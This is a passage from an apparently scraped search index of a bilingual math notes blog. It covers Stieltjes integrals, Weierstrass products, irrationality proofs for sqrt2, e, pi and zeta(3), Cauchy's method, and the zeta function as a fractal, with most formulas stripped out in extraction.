条件）至今仍是研究的热点。 概率论中的应用斯蒂尔杰斯积分在概率论中具有核心地位，它提供了描述随机变量分布的统一框架： 分布函数与期望：随机变量 的期望 可表示为斯蒂尔杰斯积分 其中 是分布函数。这一表示同时包含了离散型（ 为阶梯函数）和连续型（ 绝对连续）随机变量的情形。 切比雪夫不等式：利用斯蒂尔杰斯积分可简洁证明概率论中的基本不等式。设随机变量 的期望 ，方差 ，则对任意 ，有 证明中关键一步是将概率表示为斯蒂尔杰斯积分： 数论中的应用斯蒂尔杰斯积分在解析数论中提供了强有力的工具，特别是在处理数论函数的求和时： 黎曼 ζ 函数的近似：黎曼 ζ 函数 可表示为斯蒂尔杰斯积分 其中 是取整函数。通过分部积分可得 其中 是小数部分函数，这一表达式为 ζ 函数的解析延拓提供了途径。 素数定理的证明：素数计数函数 可表示为斯蒂尔杰斯积分 其中 是切比雪夫函数。通过分部积分和 （这是素数定理的等价形式），可得到 。 现代分析中的推广斯蒂尔杰斯积分启发了后来测度论和泛函分析的发展，主要推广方向包括： 勒贝格 - 斯蒂尔杰斯积分：由单调增加右连续函数 生成的测度 满足 ，基于此可定义勒贝格 - 斯蒂尔杰斯积分，它克服了黎曼 - 斯蒂尔杰斯积分对函数连续性的限制。 Radon-Nikodym 定理：该定理揭示了绝对连续测度与密度函数的关系，是斯蒂尔杰斯积分中 这一关系的推广。 Riesz 表示定理：Hilbert 空间上的有界线性泛函可表示为内积，这一深刻结果的一个特例是： 上的连续线性泛函可表示为斯蒂尔杰斯积分 其中 。这建立了泛函分析与斯蒂尔杰斯积分的本质联系。 结语斯蒂尔杰斯积分从根本上改变了对积分的理解，它打破了黎曼积分中区间长度作为唯一权重的限制，引入了分布函数作为更一般的权重概念，从而为现代测度论铺平了道路。回顾斯蒂尔杰斯的工作，我们看到数学创新往往源于对具体问题的深入思考，从连分数到矩问题，从力学应用到函数论研究，斯蒂尔杰斯将这些看似不相关的领域通过新的积分概念统一起来。 这一发展历程给我们的启示是：数学概念的推广不是形式上的游戏，而是对现实问题和数学内部矛盾的深刻回应。斯蒂尔杰斯积分的成功在于它既保留了黎曼积分的直观几何意义，又极大地拓展了其应用范围，这种 \"向后兼容\" 的创新使得新理论能够被数学界迅速接受并发展。 今天，斯蒂尔杰斯积分已成为分析学的基础工具，在概率论、数论、泛函分析、物理学等领域发挥着不可替代的作用。从自学成才的数学家到现代分析的奠基者，斯蒂尔杰斯的故事也激励着我们跨领域的思维碰撞和对传统观念的勇敢突破。当我们在课堂上学习斯蒂尔杰斯积分时，不仅在掌握一种数学工具，更是在传承一种勇于探索、追求统一的数学精神。"},{"title":"","date":"2025-09-14T04:09:00.000Z","updated":"2025-09-14T04:47:00.000Z","comments":true,"path":"notes/Zeta/3.html","permalink":"https://blog.mhuig.top/notes/Zeta/3","excerpt":"","text":"Clebsch's fair copy of Riemann's publication Clebsch's fair copy of Riemann's publication Riemann-1 Riemann-1 Riemann-2 Riemann-2 Riemann-3 Riemann-3 Riemann-4 Riemann-4 Riemann-5 Riemann-5 Riemann-6 Riemann-6"},{"title":"","date":"2025-10-07T10:08:00.000Z","updated":"2025-10-07T10:20:00.000Z","comments":true,"path":"notes/Zeta/30.html","permalink":"https://blog.mhuig.top/notes/Zeta/30","excerpt":"","text":"威尔斯特拉斯无穷乘积展开 威尔斯特拉斯无穷乘积展开 Let the entire function have only one-order zeros , and these zeros are non-zero. And there is a sequence of encircling paths . Satisfy the following: , is a positive number that is independent of . Then can be expressed as an infinite product: Each factor in the product . It is zero only at point . They are called the prime factors of . The Weierstrass factorization theorem asserts that every entire function can be represented as a (possibly infinite) product involving its zeroes. Let be an entire function, and let be the non-zero zeros of repeated according to multiplicity; suppose also that has a zero at of order . Then there exists an entire function and a sequence of integers such that The case given by the fundamental theorem of algebra is incorporated here. If the sequence is finite then we can take , and to obtain , Examples of factorization The trigonometric functions sine and cosine have the factorizations while the gamma function has factorization, where is the Euler–Mascheroni constant. The cosine identity can be seen as special case of for . 历史背景与动机1840 年，24 岁的卡尔・魏尔斯特拉斯（Karl Weierstrass）在明斯特大学听取克里斯托夫・古德曼（Christoph Gudermann）的椭圆函数讲座时，面临着一个关键挑战：如何严格证明阿贝尔（Abel）关于椭圆函数可表为两个整函数之商的断言。当时椭圆函数理论的核心是雅可比（Jacobi）的加法定理，而古德曼强调的幂级数方法为魏尔斯特拉斯指明了方向。这位曾在波恩大学 \"自我流放\" 十四年的学者，从高斯（Gauss）关于 的二阶微分方程 出发，开启了无穷乘积理论的系统性研究。 魏尔斯特拉斯的突破源于对椭圆函数双周期性的深刻洞察。当他将 代入高斯方程时，发现多项式序列 的次数分别为 和 。通过精妙的极限过程 ，他证明了这些多项式序列收敛到整函数，从而严格证实了阿贝尔的猜想。这一工作不仅解决了椭圆函数表示问题，更孕育了现代复分析中最强大的工具之一 —— 无穷乘积展开理论。 基本理论与定义整函数的零点分布魏尔斯特拉斯无穷乘积理论的核心问题是：给定复平面上的离散零点集 （满足 ），如何构造一个整函数使其恰以这些点为零点（计重数）。关键挑战在于直接乘积 通常发散，需引入修正因子 —— 基本因式（primary factor）： 若若 这些因式在原点附近表现为 ，而当 较大时，指数项抑制了乘积的发散。魏尔斯特拉斯证明：对任意离散零点集 （不含原点），存在整数序列 使得无穷乘积 收敛到整函数，其中 是原点处的零点重数， 是整函数。这一结果被称为魏尔斯特拉斯分解定理，它揭示了整函数的解析性质与其零点分布的深刻联系。 收敛性判定准则乘积收敛性的关键是选择适当的 。魏尔斯特拉斯证明：若存在 使得 对所有 收敛，则取 即可保证乘积在任意圆盘 上一致收敛。特别地，对阶数有限的整函数，可选取 为函数的阶数。例如指数函数 没有零点，其分解式为 ；而正弦函数的零点为 ，对应分解将在后续讨论。 核心定理的构造性证明归纳构造法魏尔斯特拉斯采用 \"逐步逼近\" 策略证明分解定理。设 为开集， 为离散点列。通过全纯凸紧集序列 覆盖 ，构造有理函数 使其在 上具有指定零点和极点。关键步骤是利用 Runge 逼近定理，将每个 表示为： 其中 是远离 的校正点。对两边取对数后，可找到全纯函数 使得 ，且 。最终通过无穷乘积 得到所需整函数。这一构造展现了魏尔斯特拉斯对一致收敛性的深刻把握 —— 他将复分析的几何直观转化为严格的分析论证，这种方法后来成为函数论中的标准技术。 零点重数与指数因子当原点是 重零点时，分解式需包含因子 。指数因子 的作用是消除乘积的不确定性：由于 仅确定到一个非零整函数因子，而任意非零整函数都可表为 （因 可定义为全纯函数）。这一洞察将整函数的 multiplicative 性质与 additive 性质（指数函数的原函数）联系起来，体现了复分析中 exp-log 对应关系的深刻性。 典型应用与实例正弦函数的无穷乘积欧拉（Euler）最早猜测 ，但未给出严格证明。利用魏尔斯特拉斯分解定理，注意 以 为单零点，且是阶数为 1 的整函数。取基本因式 ，则： 通过比较对数导数 ，可确定 ，从而得到著名的欧拉正弦乘积公式，并利用这一结果解决了巴塞尔问题。这一结果将超越函数表示为初等因式的无穷乘积，堪称分析学的美学典范。 Γ 函数的魏尔斯特拉斯形式伽马函数 的传统定义是积分形式，但魏尔斯特拉斯给出了更便于分析的无穷乘积表示： 其中 是欧拉 - 马歇罗尼常数。这一分解揭示了 的极点结构（ ），并为证明 等重要恒等式提供了简洁途径。 历史影响与现代意义魏尔斯特拉斯的无穷乘积理论彻底改变了复分析的面貌。在他之前，数学家们依赖几何直观和特殊技巧处理函数表示问题；而他建立的系统方法将整函数的研究转化为对其零点集的研究，开创了 \"解析函数的几何理论\"。这一思想在二十世纪发展为复流形上的层理论，成为代数几何与多复变函数论的基础工具。 更深远的是，魏尔斯特拉斯的严格化精神，从椭圆函数的具体问题抽象出一般理论，通过精细估计控制无穷过程，树立了现代数学的标准。 今天，当我们在复分析、数论或调和分析中使用无穷乘积时，仍能感受到这位 \"现代分析之父\" 严谨思想的深刻影响。"},{"title":"","date":"2025-10-07T10:49:00.000Z","updated":"2025-10-07T11:20:00.000Z","comments":true,"path":"notes/Zeta/31.html","permalink":"https://blog.mhuig.top/notes/Zeta/31","excerpt":"","text":"不知名的碎片 1 不知名的碎片 1 solution 1: Let Note that our sum equals Now decreases from to on Thus, for Summing on then gives This is true for any As the integral on the left approaches By the squeeze theorem, the limit of our sum equals the value of this integral, which is solution 2: Denote . We have Weierstrass factorization for hyperbolic sine is: Therefore And finally taking the limit as solution 3: Using partial fraction decomposition and summing Using the asymptotic of generalized harmonic numbers Combining all the above 另一个碎片"},{"title":"","date":"2025-10-07T10:50:00.000Z","updated":"2025-10-07T11:21:00.000Z","comments":true,"path":"notes/Zeta/32.html","permalink":"https://blog.mhuig.top/notes/Zeta/32","excerpt":"","text":"不知名的碎片 2 不知名的碎片 2 solution 1: As So: So the limit is Note that equality holds here not for a definite values but which are all less than solution 2: See if this converts to a Riemann sum which converges to an integral: The maxima seems to be at without possibly a closed form as wolfram says."},{"title":"","date":"2025-10-07T23:40:00.000Z","updated":"2025-10-07T23:42:00.000Z","comments":true,"path":"notes/Zeta/34.html","permalink":"https://blog.mhuig.top/notes/Zeta/34","excerpt":"","text":"根号 2 的无理性证明 根号 2 的无理性证明 A proof that sqrt 2 is irrational is irrational. proof by contradiction. If is a rational number, then it must be written as the ratio of two positive integers of mutual prime (that is, the common factor of both is only ) and . Square both sides to derive: is even. is even. let is even. Both and are even, which contradicts the assumption that they are prime, so is not rational, only irrational. 证明根号 2 是无理数命题： 是无理数. 反证法. 假设： 是有理数. 如果 是有理数，那么它一定可以表示为两个互质的正整数（即两者的公因数只有 ） 和 的比值。 对等式两边平方可得： 是偶数. 是偶数. 令 是偶数. 和 都是偶数, 这与他们是素数的假设相矛盾, 因此 不是有理数, 是无理数."},{"title":"","date":"2025-10-07T10:51:00.000Z","updated":"2025-10-07T11:22:00.000Z","comments":true,"path":"notes/Zeta/33.html","permalink":"https://blog.mhuig.top/notes/Zeta/33","excerpt":"","text":"不知名的碎片 3 不知名的碎片 3 with , Let be i.i.d. random variables uniformly distributed over . Since , with probability one. Moreover, by the strong law of large numbers (SLLN), holds with probability one. So by the dominated convergence theorem, 继续推广： With , , , and 另一个碎片： Since is equidistributed modulo , the limit could be rewritten as the limit of the expected value of the geometric average of uniform random variables. The integral for this would be This can actually be rewritten as since each is independent of the others. The inner integral is then equal to , so the limit is which is clearly ."},{"title":"","date":"2025-10-07T23:41:00.000Z","updated":"2025-10-07T23:43:00.000Z","comments":true,"path":"notes/Zeta/35.html","permalink":"https://blog.mhuig.top/notes/Zeta/35","excerpt":"","text":"e 的无理性证明 e 的无理性证明 A proof that e is irrationalproof by contradiction. Assuming is a rational number, it can be written as the ratio of two positive integers: Both sides of the above formula are multiplied by ( is some positive integer large enough) The right-hand side must be an integer. must be an integer. When is large enough, Must have: must not be an integer 证明 e 是无理数反证法. 假设 是有理数, 那么它能够写成两个正整数之比: 上式两边同时乘以 ( 是一个足够大的正整数) 右边一定是整数 一定是一个整数. 当 足够大时, 可以得到: 一定不是一个整数 是无理数"},{"title":"","date":"2025-10-07T23:42:00.000Z","updated":"2025-10-07T23:45:00.000Z","comments":true,"path":"notes/Zeta/36.html","permalink":"https://blog.mhuig.top/notes/Zeta/36","excerpt":"","text":"π 的无理性证明 π 的无理性证明 是无理数的半页纸证明。 没人知道写这个证明的人是怎么想到它的，人们都称它为上帝给的积分。 尼文 π 无理性证明：从历史突破到数学构造的精妙之旅 的无理性证明是数学史上的里程碑事件。尽管人类早在古希腊时期就已使用 的近似值，但直到 1761 年，瑞士数学家约翰・海因里希・兰伯特才首次证明了这个常数的无理性质。此后，包括埃尔米特、卡特莱特在内的众多数学家相继提出不同证法，但真正革命性的突破出现在 1947 年，加拿大数学家伊万・尼文（Ivan M. Niven）发表了一篇仅半页纸的证明，用初等微积分工具构建了一个逻辑严密的反证法，其简洁性与深刻性至今仍令人惊叹。 历史语境：从近似计算到严格证明的跨越 的研究史几乎与人类文明同步。巴比伦人取 作为近似值，古埃及《林德纸草书》记录为 ，而阿基米德通过正 边形计算出 的经典区间。这些估值技术在 17 世纪微积分发明后得到飞跃，莱布尼茨公式 和欧拉的无穷乘积展开式将 表达为无穷级数，但其收敛速度缓慢，更重要的是 —— 这些都无法回答 是否为有理数。 兰伯特 1767 年的原始证明基于正切函数的连分式展开，他证明了非零有理数的正切必为无理数，并通过 是有理数反推 必为无理数。但该证明涉及复杂的连分式理论，理解门槛较高。相比之下，尼文的证明仅使用多项式导数、定积分等本科低年级数学工具，却达到了同样严格的逻辑强度，这种用简单工具解决深刻问题的特质使其成为数学推理的典范。 证明架构：反证法与辅助函数的精妙构造尼文证明的核心是反证法：假设 是有理数，设 （其中 为互质正整数），然后构造一个特殊积分导出矛盾。这个证明的艺术之处在于两个精心设计的辅助函数，它们如同精密咬合的齿轮，最终迫使假设不成立。 核心函数构造第一步：定义多项式 f (x) 尼文首先构造了一个带参数 的多项式： 其中 为正整数。这个多项式具有三个关键特性： 整系数本质：展开 得到 的多项式，最低次项为 ，最高次项为 ，所有系数均为整数。除以 后， 在 和 处的各阶导数仍为整数。 对称性：通过变量代换可验证 ，这意味着 关于 对称。对等式两边求导可得 ，特别地，当 时， 。 积分估计：在区间 上， ，当 充分大时，这个值将小于 。 第二步：定义交替导数和 F (x) 基于 构造第二个辅助函数： 其中 表示 的 阶导数。这个构造的妙处在于其导数满足一个简洁关系：对 求二阶导数可得 （注意最高阶导数 ，因为 是 次多项式）。 关键等式推导导数关系与积分转化 考察函数 的导数： 这是整个证明的 \"枢纽等式\"，它将复杂的 F (x) 与 f (x) sinx 联系起来。对该等式两边从 0 到 π 积分，应用微积分基本定理得到： 整数性质分析 根据 的导数性质， 和 均为整数。而 是这些导数的整数组合（各项系数为 ），因此 和 都是整数，故它们的和 必为整数。 矛盾导出 但从积分估计可知： 当 充分大时， 的增长速度远超指数函数 ，因此右侧积分值将小于 。这导致 是一个大于 且小于 的正整数，而这样的整数不存在，矛盾！因此原假设 是有理数错误， 必为无理数。"},{"title":"","date":"2025-10-08T02:42:00.000Z","updated":"2025-10-08T02:45:00.000Z","comments":true,"path":"notes/Zeta/37.html","permalink":"https://blog.mhuig.top/notes/Zeta/37","excerpt":"","text":"Zeta 的无理性之谜 Zeta 的无理性之谜 1978 年，法国数学家 Roger Apéry 在赫尔辛基国际数学家大会上宣布了一个震惊的结果：黎曼 函数在 处的值 是无理数。这一发现终结了长达两个世纪的数学悬案，也使 获得了 \"Apéry 常数\" 的专属名称。Apéry 的原始证明以其繁复的组合恒等式和非线性递推关系著称，被数学家 Paul Erdős 评价为 \"魔鬼般的证明\"。这里将系统梳理 无理性证明的历史脉络，重点解析 1979 年 Frits Beukers 提出的简化证明，该证明通过三重积分表示与极值分析，大幅降低了理解门槛，成为数论中分析方法与代数构造结合的典范。 历史背景与问题提出黎曼 函数 自 1859 年被引入以来，其特殊值的算术性质一直是数学研究的核心课题。欧拉早在 18 世纪就证明了 ，其中 是伯努利数，这一结果不仅确立了偶数整点 值的超越性（由林德曼 - 魏尔斯特拉斯定理保证），也给出了清晰的封闭表达式。然而奇数整点的情况呈现出截然不同的复杂性 —— 除了 外，所有 （ ）的无理性至今都未得到证明，甚至尚未找到类似的封闭形式。 这种奇偶差异在数学史上形成了鲜明对比： 的无理性随 π 的超越性于 1882 年确立，而 的无理性问题却顽强抵抗了近百年的攻击。1978 年 Apéry 的突破采用了构造特殊有理逼近序列的方法，他定义了满足三阶非线性递推关系的序列： 通过证明该序列比值收敛于 且收敛速度足够快，Apéry 成功构造出无穷多个接近 的有理数，从而导出矛盾。尽管这一证明在逻辑上无懈可击，但其中复杂的二项系数组合（如 ）和非线性递推关系的来源一直被视为 \"从天而降\"，难以直观理解。 Beukers 简化证明的核心框架1979 年，荷兰数学家 Frits Beukers 发表了一篇里程碑式的论文，将 Apéry 的代数构造转化为更具几何直观的三重积分表示。这一证明的核心思想可概括为四个关键步骤： 建立 的二重积分表示 引入 Legendre 多项式构造有理逼近 通过变量代换将积分转化为三重形式 估计积分余项的指数衰减速度 这种方法的优势在于将数论问题转化为分析问题，利用积分变换和极值原理代替复杂的组合恒等式。证明的起点是如下无理数判别准则：若存在整数序列 使得 ，则 必为无理数。这一准则可通过反证法简单证明：假设 （既约分数），则 ，与左边趋于零矛盾。 Beukers 首先建立了 的积分表示。通过将 展开为几何级数并逐项积分，他证明了： 这一表示将 与单位正方形上的二重积分联系起来，其中被积函数的奇异性恰好在 处，对应级数的收敛边界。更一般地，当引入非负整数 时，积分 可表示为 与有理数的线性组合，这构成了逼近构造的基础。 关键引理与积分变换Beukers 证明的技术核心在于引入 Legendre 多项式 ，这一特殊多项式具有两个关键性质：整系数性和正交性类似的积分表示。通过分部积分可得： 这一恒等式将 与 的 阶导数积分联系起来，当 具有合适的解析性质时，右边积分可得到精确估计。 通过构造二元乘积 ，Beukers 将 的二重积分表示转化为三重积分： 这一步通过巧妙的变量替换 实现，将对数项转化为几何级数积分，展现了分析变换的深刻洞察力。对 和 分别应用 次分部积分后，积分最终化简为： 这一形式的关键价值在于被积函数中出现了方括号内的分式 的 次幂，为指数衰减估计创造了条件。 极值分析与收敛速度估计Beukers 证明的高潮在于对函数 的极值分析。通过求解偏微分方程组 ，他发现 在单位立方体 内部存在唯一极值点： 在该点处的函数值为 ，这一数值小于 ，意味着 将以指数速度衰减。通过将三重积分区域分为极值点邻域和其余部分，Beukers 建立了关键估计： 其中 是前 个自然数的最小公倍数， 为整数。 证明的最后一环是对 阶的估计。数论中的经典结果表明 ，这等价于素数定理（通过切比雪夫函数 ）。因此 ，而 ，故整体余项满足： 这就构造出了满足无理数判别准则的整数序列 ，从而完成了 无理性的证明。 后续发展与未解决问题Beukers 的证明不仅简化了 Apéry 的原始工作，更为无理数证明开创了 \"积分 - 极值\" 方法的新范式。这一方法的核心思想 —— 通过特殊函数构造逼近序列，利用分析工具估计收敛速度 —— 被成功应用于其他常数的研究： 1996 年 T. Rivoal 证明存在无穷多个 是无理数 2001 年 W. Zudilin 证明 中至少有一个无理数 2018 年 N. A. Carella 尝试将方法推广到一般 ，但尚未完全成功 值得注意的是，尽管 Beukers 方法具有高度启发性，但它仍未解决核心难题：为何 的证明相对简单，而 的证明却至今未知？一种可能的解释来自动力系统理论，Apéry 的递推关系对应于具有双曲不动点的非线性映射，其稳定流形的存在保证了快速收敛的有理逼近。而高阶 值可能对应更高维的动力学系统，其周期轨道结构更为复杂。 现代数学研究正从多个角度推进这一领域：2023 年的最新工作将 Feynman 积分表示为 \"Apéry 极限\"，通过镜像对称和有限域点计数建立了物理理论与数论之间的深刻联系。这些进展暗示， 的无理性可能只是冰山一角，其背后隐藏着算术几何与量子场论的深层关联。 结语：从特殊到一般的数学思维 无理性证明的历史演进展现了数学研究的典型范式：从特殊问题出发（欧拉时代），经历长期探索（百年悬案），通过突破性构造（Apéry），最终获得概念性理解（Beukers）。Beukers 的三重积分证明之所以被广泛推崇，不仅因其技术简洁，更在于它揭示了无理数证明的本质，构造具有超指数收敛速度的有理逼近。 这一证明也留下了深刻的哲学启示：在数学中，复杂的代数构造往往可以通过分析表示获得直观理解，正如 的算术性质通过几何积分得到阐明。当前，数学家们正沿用这一思路，尝试通过模形式、动机理论等工具攻克 的无理性问题。无论未来进展如何，Apéry 和 Beukers 的工作已经永久改变了我们对 函数的理解，展示了人类理性面对数学奥秘时的创造力与洞察力。 值的无理性研究，是当代数学中分析、代数与几何交汇融合的最佳见证。在这个充满未知的领域，每一个小的进展都可能带来意想不到的突破。"},{"title":"","date":"2025-10-08T03:30:00.000Z","updated":"2025-10-08T03:40:00.000Z","comments":true,"path":"notes/Zeta/38.html","permalink":"https://blog.mhuig.top/notes/Zeta/38","excerpt":"","text":"Niven 的无理数 Niven 的无理数 IRRATIONAL NUMBERS by IVAN NIVEN Similarities in Irrationality Proofs for π,ln2,ζ(2),and ζ(3) 注：第一个式子是错误的。"},{"title":"","date":"2025-10-08T06:42:00.000Z","updated":"2025-10-08T06:45:00.000Z","comments":true,"path":"notes/Zeta/39.html","permalink":"https://blog.mhuig.top/notes/Zeta/39","excerpt":"","text":"柯西方法 柯西方法 Cauchy methodWe know that the function is continuous over , and satisfy . Seek verification : That is, it is a direct proportional function. The essence of Cauchy method is that it first proves that the conclusion is valid for integers, then completes the conclusion for rational numbers, and finally proves that the conclusion is valid for real numbers. let , we get , then we get . let , we get . Because , therefore , therefore is an odd function. The following proofs only discuss cases where the independent variable is positive, and cases where the symmetry of the odd function can yield negative numbers. The proof-conclusion holds for integers. Easy proof by mathematical induction: , , : let ,we get: let in the formula , we get: So this is true for integers. let , we get: then, from formula we get : therefore: let we get: So the conclusion holds for rational numbers. From the properties of numbers, we can see that for any real number there exists a series of rational numbers such that And by the continuity of canknow: Because is a rational number, therefore: therefore: therefore: So the conclusion is true for real numbers. QED. 柯西方法奥古斯坦 - 路易・柯西（Augustin-Louis Cauchy，1789-1857）在数学史上的地位，恰如他所处的 19 世纪上半叶，一个新旧思想激烈碰撞的变革时代。作为现代分析学的奠基人，柯西以其对严格性的执着追求，将微积分从几何直观和无穷小的模糊概念中解放出来，重构为以极限为核心的逻辑体系。这种思想方法不仅体现在他对极限、连续、导数等基本概念的重新定义中，更凝结为一种解决问题的范式，柯西方法，其核心精神表现为 \"从特殊到一般、从具体到抽象\" 的分层递进策略。本文将系统梳理柯西方法的历史背景、理论基础及其在函数方程求解中的典范应用，揭示其如何成为连接古典数学与现代数学的桥梁。 历史背景：19 世纪初的数学危机与柯西的严格化运动18 世纪的微积分如同一个神通广大却根基不稳的巨人。牛顿用 \"流逝量\"（fluxion）、莱布尼茨用 \"无穷小\" 构建的算法体系，在天文学、力学领域取得了辉煌成就，但这些概念始终缺乏清晰的逻辑定义。贝克莱主教 1734 年在《分析者》中尖锐指出：\"无穷小量是已死量的幽灵\"，直指微积分基础中的逻辑矛盾。欧拉将函数视为解析式的观点，以及拉格朗日试图用幂级数定义导数的尝试，都未能彻底解决这些矛盾。 柯西诞生于法国大革命爆发的 1789 年，成长于拿破仑时代的学术复兴期。他的父亲作为巴黎高等法院的律师，与拉格朗日、拉普拉斯等数学家过从甚密，使少年柯西获得了得天独厚的学术熏陶。拉格朗日曾告诫柯西父亲：\"赶快给柯西一种坚实的文学教育，以便他的爱好不致把他引入歧途\"，这种建议竟意外塑造了柯西兼具严密逻辑与清晰表达的学术风格。1807 年进入巴黎综合理工学院后，柯西在工程实践中意识到，缺乏严格基础的数学可能导致工程设计的隐患，这促使他致力于分析学的严格化。 1821 年，柯西出版《皇家综合工科学院分析教程》，这部著作标志着严格分析时代的开端。他首次将极限定义为 \"当一个变量的相继值无限趋近某个固定值时，如果最终同固定值之差可以随意地小，那么这个固定值就称为所有这些值的极限\"。这个定义用不等式刻画极限过程，避免了 \"无穷小\" 的模糊表述，为整个微积分体系奠定了严格基础。正是在这部著作中，柯西系统发展了后来被称为 \"柯西方法\" 的问题解决策略，其核心思想在他处理函数方程时得到了最为鲜明的体现。 柯西方法的理论基础：从整数到实数的分层推进策略柯西方法的精髓在于将复杂问题分解为可逐步解决的层次，通过对简单情形的彻底解决，为更一般情形提供归纳基础。这种方法论在柯西处理加性柯西方程时展现得淋漓尽致，该方程后来成为以他命名的一类函数方程的原型。方程表述如下：设函数 满足对任意实数 ，均有 ，求 的一般形式。柯西对这个方程的解决，完美诠释了其方法论的四个层次： 第一步：整数域上的解柯西首先考虑最简单的情形：当 为正整数时。设 ，通过数学归纳法可证： 令 ，则对正整数 有 。对于负整数 ，利用 ，可推得 。因此对所有整数 ，方程解为 。 第二步：有理数域上的解对于有理数 （其中 ），柯西通过构造方程 ，解得 。这表明在有理数域上，方程的解仍为线性函数 。 第三步：实数域上的解与正则性条件当扩展到实数域时，柯西发现仅仅依靠方程的加性条件不足以保证解的唯一性。他证明了：若 在某区间内连续（或有界、或单调），则对所有实数 ，有 。这个结果揭示了一个深刻事实：在实数域上，函数方程的解可能存在非构造性的病态解（如利用选择公理构造的不连续解），但在自然的正则性条件下，解必然是线性的。柯西的这一发现，开创了泛函方程研究中 \"正则性蕴含结构性\" 的重要方向。 柯西方法的分层策略具有普适性。正如他在处理重复积分问题时所展示的，通过将 重积分转化为含参变量的单积分，逐步推导得到公式： 这种从低维到高维、从简单到复杂的递进方式，成为后世数学研究的典范。 柯西方程的推广与柯西不等式的方法论意义柯西方法的影响远超出函数方程领域。在《分析教程》中，柯西还系统研究了其他类型的函数方程，包括乘法型 、指数型 和对数型 等，这些方程在他的分层策略下都得到了系统解决。其中，柯西不等式作为一种重要的工具，其证明过程本身就是柯西方法的精彩应用。 柯西不等式的多种证明与几何意义柯西不等式的离散形式表述为：对任意实数 和 ，有 等号成立当且仅当 （ 为常数）。柯西最初的证明采用了参数配方法，构造二次函数： 由于 对所有 成立，其判别式 ，由此直接推得不等式。这种证明体现了柯西将代数结构与分析工具结合的典型风格。 柯西不等式的向量形式 ，揭示了其深刻的几何意义 —— 两个向量的内积不超过它们模长的乘积。这一解释将不等式从代数推向几何，为后续泛函分析中希尔伯特空间的定义埋下伏笔。值得注意的是，柯西不等式的积分形式 可视为离散形式的连续化推广，其证明同样遵循 \"从有限到无限\" 的柯西式递进思路。 柯西不等式的应用：从极值问题到几何证明柯西不等式作为优化问题的锐利工具，在求最值时展现出惊人威力。例如，对于问题 \" 已知 ，求 的最小值 \"，柯西不等式给出简洁解法： 平方后即得 。这种方法避免了传统求导或消元法的繁琐计算，直接锁定最优解。 在几何领域，柯西不等式为距离问题提供了统一处理框架。点到直线的距离公式、两平行线间的距离公式，甚至椭圆上一点到直线距离的最值问题，都可通过柯西不等式简洁推导。例如，对于椭圆 上一点到直线 的距离，柯西不等式给出： 从而直接得到 的取值范围。这种代数方法与几何直观的完美结合，正是柯西方法论的精髓所在。"},{"title":"","date":"2025-09-14T05:15:00.000Z","updated":"2025-09-14T05:42:00.000Z","comments":true,"path":"notes/Zeta/4.html","permalink":"https://blog.mhuig.top/notes/Zeta/4","excerpt":"","text":"Clebsch's fair copy of Riemann's publication Clebsch's fair copy of Riemann's publication"},{"title":"","date":"2025-10-08T10:40:00.000Z","updated":"2025-10-08T10:50:00.000Z","comments":true,"path":"notes/Zeta/41.html","permalink":"https://blog.mhuig.top/notes/Zeta/41","excerpt":"","text":"黎曼 Zeta 函数是分形 黎曼 Zeta 函数是分形 也许我们就生活在黎曼 Zeta 函数这张膜上，我们只不过是这个膜在某个位置的全息投影。 黎曼的手稿黎曼手稿的命运堪称科学史上的惊险传奇。1866 年黎曼因肺结核去世后，其管家曾烧毁大部分手稿，幸得妻子埃莉泽・科赫抢救出部分残页，并将核心内容交给黎曼生前好友、数学家戴德金。尽管埃莉泽后来取回了含私人信息的部分，但戴德金保留的数学手稿最终被哥廷根大学永久收藏，成为验证黎曼猜想的 “密码本”。 1932 年，数学家西格尔正是从这些交错书写的公式中，发掘出远超时代的零点计算方法，整理出著名的黎曼 - 西格尔公式，将零点计算效率提升百倍，至今仍是解析数论的核心工具。 后来人们在黎曼的手稿中发现，黎曼对 函数零点的研究，竟然与他当时解决流体力学经典问题的内容，紧挨在一起，也许这两者背后还有更深层次的联系。 在同一页纸上，黎曼既演算着 函数的非平凡零点，又推导着流体运动的特征线方程，这种跨学科的思维并置在当时未被理解，却为当代非线性科学埋下伏笔。 黎曼的手稿，再一次体现了这位数学家思想的超越性。 这些手稿的并置书写，恰似科学史上的 “罗塞塔石碑”：当现代数学家发现黎曼零点间距与重原子能级分布的对应关系时，当流体力学实验证实湍流分形维数与能谱幂次的关联时，人们才逐渐读懂黎曼当年在纸页间埋下的跨学科线索。 不止数学天赋，所有类型的天赋本质上只有一个原因，就是将事物联系到一起的能力。 Riemann zeta function is a fractal 黎曼 ζ 函数的分形本质：从普遍性定理到自相似结构黎曼 Zeta 函数 作为数学中最神秘的函数之一，其分形属性源于一个深刻的数学事实: 沃罗宁（Voronin）普遍性定理。这一定理揭示了 函数在复平面临界带右半部分（ ）的惊人特征：它能以任意精度逼近任何非零解析函数，这种普适性直接蕴含了自相似的分形结构。分形的核心定义，在不同尺度下呈现相似模式，在此通过 函数的解析延拓和无穷多平移副本的重叠得以实现，正如曼德博集合通过迭代映射展现自相似性一样。 历史背景：从黎曼猜想到普遍性定理1859 年，黎曼在《论小于给定数值的素数个数》中首次引入 函数，将其定义域从实部大于 1 的区域解析延拓至整个复平面（除 的极点外），并提出了关于非平凡零点均位于 直线上的著名猜想。此后一个多世纪，数学家们逐步揭示了 函数的解析性质，但直到 1975 年，苏联数学家沃罗宁（S.M. Voronin）证明的普遍性定理才为其几何特征带来革命性认知。该定理表明，对于临界带内 的直线， 函数沿此直线的垂直平移（ ， 为实数）能够逼近任何非零解析函数，这一性质为分形结构提供了严格数学基础。 分形定义与沃罗宁定理的数学表述分形的核心特征分形是指具有自相似性（在不同尺度下重复自身结构）和非整数分形维数的集合。对于 ζ 函数而言，其分形性体现为：在复平面的不同区域（由参数 控制的平移副本）中，函数图像呈现统计意义上的结构重复，而非严格的几何递归（如科赫雪花的无限迭代）。 沃罗宁定理的严格表述定理（Voronin, 1975）：设 ， 是在 上解析且非零的复函数。对任意 ，存在实数 ，使得 该定理的关键在于： 函数沿临界带内 的直线平移后，能 “模仿” 任何非零解析函数的局部行为。这一普适性为构造自相似结构提供了工具。 分形性的推导：通过尺度变换映射实现自相似核心思想通过选取特定的解析函数 （其中 为尺度因子， 为中心），利用沃罗宁定理证明 函数在不同尺度下的结构重叠，从而建立自相似性。 步骤 1：构造尺度依赖的解析函数设 （ 为正整数， ， , 为实数），定义 ，其中 在 上非零解析。由沃罗宁定理，存在 使得： 步骤 2：定义圆盘映射与平移副本记 为中心在 、半径 的圆盘（ ）， 为中心在 、半径 的圆盘（ ）。上式定义了映射 ，将尺度放大的圆盘 映射到固定尺度的圆盘 ，且保持 函数值的近似相等。 步骤 